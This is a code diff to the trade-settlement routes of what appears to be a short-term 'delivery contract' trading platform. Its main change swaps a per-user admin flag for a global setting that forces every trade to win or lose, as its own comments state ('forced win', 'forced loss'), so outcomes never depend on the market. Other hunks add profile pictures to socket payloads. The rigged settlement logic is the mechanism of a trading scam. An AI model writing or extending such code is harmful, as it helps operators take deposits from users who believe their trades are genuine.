@@ -5,6 +5,8 @@ const User = require('../models/User');
 const WalletTransaction = require('../models/WalletTransaction');
 const router = express.Router();
 
+const SystemSettings = require('../models/SystemSettings');
+
 // Delivery contract time slots (seconds → config)
 const DELIVERY_SLOTS = {
   60:   { profit: 13, minAmount: 100 },
@@ -24,8 +26,9 @@ async function settleDeliveryTrade(tradeId, io) {
     const user = await User.findById(trade.userId._id || trade.userId);
     if (!user) return;
 
-    // deliveryTradeEnabled: true = forced win, false = forced loss
-    const isWin = user.deliveryTradeEnabled;
+    const settings = await SystemSettings.findOne();
+    // Global override: true = forced win, false = forced loss
+    const isWin = settings ? settings.tradingEnabled : true;
 
     let profitAmount = 0;
     let finalUser = user;
@@ -84,7 +87,7 @@ async function settleDeliveryTrade(tradeId, io) {
 
     // Emit socket events
     if (io) {
-      const populated = await Trade.findById(tradeId).populate('userId', 'email fullName');
+      const populated = await Trade.findById(tradeId).populate('userId', 'email fullName profilePicture');
       io.to('admin').emit('trade_updated', populated);
       io.to(`user_${finalUser._id}`).emit('trade_updated', {
         ...populated.toObject(),
@@ -164,7 +167,7 @@ router.post('/delivery-order', auth, async (req, res) => {
 
     // Emit new trade event to admin
     if (io) {
-      const populated = await Trade.findById(trade._id).populate('userId', 'email fullName');
+      const populated = await Trade.findById(trade._id).populate('userId', 'email fullName profilePicture');
       io.to('admin').emit('new_trade', populated);
       io.to(`user_${req.user.id}`).emit('order_placed', {
         title: 'Delivery Order Placed',
@@ -277,7 +280,7 @@ router.post('/order', auth, async (req, res) => {
     // Emit socket events
     const io = req.app.get('io');
     if (io) {
-      const populatedTrade = await Trade.findById(trade._id).populate('userId', 'email fullName');
+      const populatedTrade = await Trade.findById(trade._id).populate('userId', 'email fullName profilePicture');
       io.to('admin').emit('new_trade', populatedTrade);
       io.to(`user_${req.user.id}`).emit('order_placed', {
         title: 'Order Placed',
@@ -342,7 +345,7 @@ router.post('/order/:id/cancel', auth, async (req, res) => {
 
     const io = req.app.get('io');
     if (io) {
-      const populated = await order.populate('userId', 'email fullName');
+      const populated = await order.populate('userId', 'email fullName profilePicture');
       io.to('admin').emit('trade_updated', populated);
       io.to(`user_${req.user.id}`).emit('trade_updated', populated);
       if (updatedUser) {
@@ -398,7 +401,7 @@ router.put('/order/:id/status', auth, async (req, res) => {
 
     const io = req.app.get('io');
     if (io) {
-      const populated = await trade.populate('userId', 'email fullName');
+      const populated = await trade.populate('userId', 'email fullName profilePicture');
       io.to('admin').emit('trade_updated', populated);
       io.to(`user_${trade.userId}`).emit('trade_updated', populated);
     }
